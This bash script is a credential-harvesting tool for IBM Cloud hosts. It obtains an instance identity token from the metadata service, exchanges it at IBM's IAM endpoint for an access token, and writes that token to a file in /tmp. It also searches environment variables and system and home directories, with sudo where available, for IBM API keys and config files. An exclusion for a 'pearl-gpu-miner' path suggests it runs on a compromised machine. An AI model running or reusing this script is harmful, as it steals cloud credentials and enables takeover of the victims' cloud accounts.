#!/bin/bash
# runs ON host; harvests IBM Cloud instance identity + any API key; prints token metadata only
set -u
SUDO=""; [ "$(id -u)" != "0" ] && SUDO="sudo -n"
echo "HOST=$(hostname) ID=$(id -un)"
echo "--- IMDS v1 token (PUT) ---"
TOK=$(curl -s -m 8 -X PUT "http://169.254.169.254/instance_identity/v1/token" -H "Metadata-Flavor: ibm" -d '{"expires_in":3600}' | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "IMDS_TOKEN_LEN=${#TOK}"
if [ -n "$TOK" ]; then
  echo "--- instance ---"
  curl -s -m 8 -H "Authorization: Bearer $TOK" "http://169.254.169.254/instance?version=2022-03-01" | head -c 1200; echo
  echo "--- identity ---"
  curl -s -m 8 -H "Authorization: Bearer $TOK" "http://169.254.169.254/identity?version=2022-03-01" | head -c 600; echo
  echo "--- iam exchange ---"
  RT=$(curl -s -m 15 -X POST "https://iam.cloud.ibm.com/identity/token" -H "Content-Type: application/x-www-form-urlencoded" -H "Accept: application/json" --data-urlencode "grant_type=urn:ibm:params:oauth:grant-type:iam-jwt" --data-urlencode "assertion=$TOK")
  echo "$RT" | python3 -c 'import sys,json
d=json.load(sys.stdin)
print("IAM_OK", d.get("token_type"), "expires_in", d.get("expires_in"), "scope", d.get("scope"))
t=d.get("access_token","")
print("IAM_TOKEN_LEN", len(t))
open("/tmp/ul_iam_token.txt","w").write(t)' 2>&1 | head -5
fi
echo "--- classic metadata ---"
curl -s -m 6 "http://169.254.169.254/2018-06-01/metaData.json" | head -c 400; echo
echo "--- api keys in env/fs ---"
env | grep -aiE 'IBMCLOUD|IC_API|IAM_API|BLUEMIX' | sed 's/=\(.\{8\}\).*/=\1…/' || echo none
$SUDO grep -raslE 'IBMCLOUD_API_KEY|apikey.*ibm|iam.cloud.ibm.com' /etc /opt /root /home 2>/dev/null | grep -vE 'pearl-gpu-miner|libcudart' | head -10 || true
ls -l ~/.bluemix/config.json /root/.bluemix/config.json 2>/dev/null || true
echo IMDS_DONE
